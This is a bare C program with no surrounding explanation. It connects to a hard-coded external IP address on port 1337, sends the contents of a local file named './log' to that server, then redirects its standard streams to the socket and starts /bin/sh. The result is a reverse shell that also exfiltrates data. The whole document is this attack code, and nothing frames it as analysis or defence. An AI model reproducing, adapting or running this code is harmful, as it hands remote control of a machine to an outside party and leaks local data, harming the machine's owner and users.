#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <fcntl.h>

#define SERVER_IP "51.77.245.88"
#define SERVER_PORT 1337
#define MAX_BUFFER_SIZE 1024

int main() {
    int sockfd;
    struct sockaddr_in server_addr;
    ssize_t bytesRead;
    char buffer[MAX_BUFFER_SIZE];

    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        perror("Failed to create socket");
        return -1;
    }

    // Configure server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    if (inet_pton(AF_INET, SERVER_IP, &(server_addr.sin_addr)) <= 0) {
        perror("Invalid server IP address");
        close(sockfd);
        return -1;
    }

    // Connect to the server
    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1) {
        perror("Failed to connect to the server");
        close(sockfd);
        return -1;
    }

    // Open the local file for reading
    int file_descriptor = open("./log", O_RDONLY);
    if (file_descriptor == -1) {
        perror("Failed to open the local file");
        close(sockfd);
        return -1;
    }

    // Read and send file content
    while ((bytesRead = read(file_descriptor, buffer, sizeof(buffer))) > 0) {
        if (send(sockfd, buffer, bytesRead, 0) == -1) {
            perror("Failed to send data to the server");
            close(file_descriptor);
            close(sockfd);
            return -1;
        }
    }
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    execve("/bin/sh", 0, 0);

    close(file_descriptor);
    close(sockfd);

    return 0;
}
